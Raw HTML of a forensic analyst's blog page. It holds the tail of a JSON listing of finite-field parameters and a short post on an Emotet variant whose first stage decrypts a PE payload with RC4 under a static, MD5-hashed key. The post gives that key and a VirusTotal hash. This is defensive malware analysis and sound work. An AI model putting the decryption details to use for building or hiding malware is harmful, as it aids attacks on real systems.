plain">        &quot;Fq2&quot;: &quot;df25d091-9992-5b89-9ab7-487678fbd9d3&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;r&quot;: &quot;aWgEPTl1tmebfs3ZETd8TJLcWlT&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;phikonr&quot;: &quot;1iRiNwETOuqBD7ugR7bRatbQL7JDKXfb6QfKFlQdbxb46gQKAjLCS397ZbnU&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &quot;6e9b64ba-e391-5c46-a9b9-0527b3c22212&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;type&quot;: &quot;field&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;subtype&quot;: &quot;mulg&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;id&quot;: &quot;6e9b64ba-e391-5c46-a9b9-0527b3c22212&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;order&quot;: &quot;aWgEPTl1tmebfs3ZETd8TJLcWlT&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;pairing&quot;: &quot;86ec11e5-802e-5ea0-9cc6-5a429f653359&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;base&quot;: &quot;df25d091-9992-5b89-9ab7-487678fbd9d3&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &quot;df25d091-9992-5b89-9ab7-487678fbd9d3&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;type&quot;: &quot;field&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;subtype&quot;: &quot;fi&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;id&quot;: &quot;df25d091-9992-5b89-9ab7-487678fbd9d3&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;order&quot;: &quot;11QugYb4N8ouqquotyF8IDXtacHwMTbO0nzw4DSKv860wA8OmQwaM5NwQDuGzdsaq7qNH2vjKAZYuuiiAkgzugeZZJGzPCyBalRcL5Un43QnC77oOh4PwFfDudE7kPVfi9kMYY9ETj6JjicbhyWKqsrYaU4WMTQfwjMsA1IwD08m1&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;pairing&quot;: &quot;86ec11e5-802e-5ea0-9cc6-5a429f653359&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;base&quot;: &quot;49f4d9d3-3110-5d68-a069-d035ef71b54b&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &quot;49f4d9d3-3110-5d68-a069-d035ef71b54b&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;type&quot;: &quot;field&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;subtype&quot;: &quot;montfp&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;id&quot;: &quot;49f4d9d3-3110-5d68-a069-d035ef71b54b&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;order&quot;: &quot;10iCaKEy0HbDHT6PP7xruLvQ6exXF4OXOWMsLG1cWzUGqHPKb3iHXFPHp5i6InsKwpSoCRA0udlrariW7VXEft1&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;modulus&quot;: &quot;10iCaKEy0HbDHT6PP7xruLvQ6exXF4OXOWMsLG1cWzUGqHPKb3iHXFPHp5i6InsKwpSoCRA0udlrariW7VXEft1&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;negpinv&quot;: &quot;KdbJ0wZgOLZ&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;R&quot;: &quot;Y3IcJ7iNkOkQg5TzeRWCJ5hLYyIjT6hZsVtkHTRaFzT7sr2lxvr37CT7VuW77EbDxq0kazOYLhOdzC31vZhUzz&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;R3&quot;: &quot;ebReJS6QeiIxqNFKFf4H01oKlyOviNcOAYf0Ksc4DVIJ8Uk1AxsCiwdUCbzMFFEwkBwtsN5OHZ7ThgIxHNwAq8&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &quot;a6d00cef-ce1b-5410-bd45-41a0058b4540&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;type&quot;: &quot;field&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;subtype&quot;: &quot;montfp&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;id&quot;: &quot;a6d00cef-ce1b-5410-bd45-41a0058b4540&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;order&quot;: &quot;aWgEPTl1tmebfs3ZETd8TJLcWlT&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;modulus&quot;: &quot;aWgEPTl1tmebfs3ZETd8TJLcWlT&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;negpinv&quot;: &quot;1&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;R&quot;: &quot;01lnGH9GscRlVEuYE2YC&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;R3&quot;: &quot;2HXdeLEYzbwUJfGOVzp6EZRig0e&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &quot;a4cb7d3e-d31e-5472-9928-0b17725c9ae4&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;type&quot;: &quot;element&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;id&quot;: &quot;a4cb7d3e-d31e-5472-9928-0b17725c9ae4&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;field&quot;: &quot;49f4d9d3-3110-5d68-a069-d035ef71b54b&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;x&quot;: &quot;1&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &quot;a47e3ca0-d570-5fe4-bd87-245b0100dbc2&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;type&quot;: &quot;element&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;id&quot;: &quot;a47e3ca0-d570-5fe4-bd87-245b0100dbc2&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;field&quot;: &quot;49f4d9d3-3110-5d68-a069-d035ef71b54b&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;x&quot;: &quot;0&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/blog/2021/01/25/some-emotet-variants-use-bad-crypto-in-the-first-stage">Some emotet variants use bad crypto (in the first stage)</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2021-01-25T00:00:00.000Z">January 25, 2021</time> · <!-- -->One min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo" src="https://github.com/janstarke.png" alt="Jan Starke"></a><div class="avatar__intro"><div class="avatar__name"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer"><span>Jan Starke</span></a></div><small class="avatar__subtitle">Senior Forensic Analyst</small></div></div></div></div></header><div class="markdown"><p>What can I say? I recently analyzed an emotet variant which I found in a customer network. Eventually, I found that a new PE binary was being encrypted and loaded into memory. As encryption, simple RC4 was being used, with a static key <code>@nw&lt;jss6fG3Na4jvh^c&amp;4Cgp$*rZ&lt;g?TD@%FgTnwg3</code>, hashed with MD5, which results in <code>21755ce816bd55c92f57eb4fd2060197</code> as RC4 key.</p>
<p><a href="/assets/files/key_generation-1c02fb41dce81ad838cecaed6063778b.png" target="_blank"><img decoding="async" loading="lazy" src="/assets/images/key_generation-1c02fb41dce81ad838cecaed6063778b.png" width="3360" height="2020" class="img_ev3q"></a></p>
<p>Fortunately, it was not necessary to do the decryption on my own. I could simply set a breakpoint after 0x100013B5 and could read the resulting plaintext PE image.</p>
<p>I instantly uploaded it to <a href="https://www.virustotal.com/gui/file/f6d224a8af3d56e8d17ccea43a8ac6791e658b656e481630a770716b6116fc0c/detection" target="_blank" rel="noopener noreferrer">https://www.virustotal.com/gui/file/f6d224a8af3d56e8d17ccea43a8ac6791e658b656e481630a770716b6116fc0c/detection</a></p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/forensics">forensics</a></li></ul></div></footer></article><nav class="pagination-nav" aria-label="Blog list page navigation"><a class="pagination-nav__link pagination-nav__link--next" href="/blog/page/2"><div class="pagination-nav__label">Older Entries</div></a></nav></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">Blog</a></li><li class="footer__item"><a class="footer__link-item" href="/about">About</a></li><li class="footer__item"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2024 Jan Starke. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>